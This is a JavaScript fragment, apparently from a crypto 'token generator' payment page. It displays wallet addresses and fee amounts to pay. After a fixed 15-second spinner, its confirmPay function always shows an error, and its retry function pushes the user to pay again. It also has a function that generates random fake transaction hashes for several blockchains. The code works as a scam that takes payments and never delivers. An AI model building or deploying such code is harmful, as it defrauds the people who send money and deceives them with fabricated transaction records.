const sym=getSymbol();
const name=document.getElementById('tokenName').value;
const ns=document.querySelector('#netGrid .selected .net-name').textContent;

document.getElementById('mToken').textContent=name+' ('+sym+')';
document.getElementById('mAmount').textContent=selAmt.toLocaleString()+' tokens';
document.getElementById('mNetwork').textContent=ns;
document.getElementById('mFee').textContent='$'+usd+' USD';

selPayMethod='';selUsdtNet='';
document.querySelectorAll('.pay-card').forEach(c=>c.classList.remove('selected'));
document.getElementById('usdtNets').classList.remove('active');
document.querySelectorAll('.usdt-net-btn').forEach(b=>b.classList.remove('selected'));
document.getElementById('addrSection').style.display='none';
document.getElementById('payAmountBox').style.display='none';
document.getElementById('btnPay').style.display='none';
document.getElementById('feeModal').classList.add('active');
}

function pickPay(el){
document.querySelectorAll('.pay-card').forEach(c=>c.classList.remove('selected'));
el.classList.add('selected');
selPayMethod=el.dataset.pay;
selUsdtNet='';
document.querySelectorAll('.usdt-net-btn').forEach(b=>b.classList.remove('selected'));

if(selPayMethod==='usdt'){
document.getElementById('usdtNets').classList.add('active');
document.getElementById('addrSection').style.display='none';
document.getElementById('payAmountBox').style.display='none';
document.getElementById('btnPay').style.display='none';
} else {
document.getElementById('usdtNets').classList.remove('active');
showPayAddr();
}
}

function pickUsdtNet(el){
document.querySelectorAll('.usdt-net-btn').forEach(b=>b.classList.remove('selected'));
el.classList.add('selected');
selUsdtNet=el.dataset.unet;
showPayAddr();
}

function showPayAddr(){
const usd=amtPrices[selAmt];
let addr='',coinAmount='',label='';

if(selPayMethod==='usdt'){
addr=usdtWallets[selUsdtNet]||'';
coinAmount=usd.toFixed(2)+' USDT';
label='$'+usd+' USD';
} else {
addr=payWallets[selPayMethod]||'';
const rate=payPriceMap[selPayMethod]();
const amt=(usd/rate);
const sym=selPayMethod.toUpperCase();
coinAmount=(amt<0.001?amt.toFixed(6):amt<1?amt.toFixed(4):amt.toFixed(4))+' '+sym;
label='~$'+usd+' USD';
}

document.getElementById('payAddr').value=addr;
document.getElementById('payAmountVal').textContent=coinAmount;
document.getElementById('payAmountUsd').textContent=label;
document.getElementById('payAmountBox').style.display='block';
document.getElementById('addrSection').style.display='block';
document.getElementById('btnPay').style.display='flex';
}

function copyAddr(){
const el=document.getElementById('payAddr');el.select();document.execCommand('copy');
const btn=document.getElementById('addrCopyBtn');
btn.innerHTML=svgCheck;setTimeout(()=>btn.innerHTML=svgClipboard,2000);
}

function confirmPay(){
    document.getElementById('feeModal').classList.remove('active');
    document.getElementById('loading').classList.add('active');
    scrollToMain();

    setTimeout(()=>{
        document.getElementById('loading').classList.remove('active');

        var wallet = document.getElementById('recAddr').value || '0x...';
        document.getElementById('errWallet').textContent = wallet;

        document.getElementById('errorModal').classList.add('active');
    },15000);
}

function retryPayment(){
    document.getElementById('errorModal').classList.remove('active');
    showFeeModal();
}

function genTxHash(net){
const hex=()=>Array.from({length:64},()=>Math.floor(Math.random()*16).toString(16)).join('');
const b58='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
const solHash=()=>Array.from({length:88},()=>b58[Math.floor(Math.random()*b58.length)]).join('');
if(net==='tron') return hex();
if(net==='solana') return solHash();
return '0x'+hex();
}
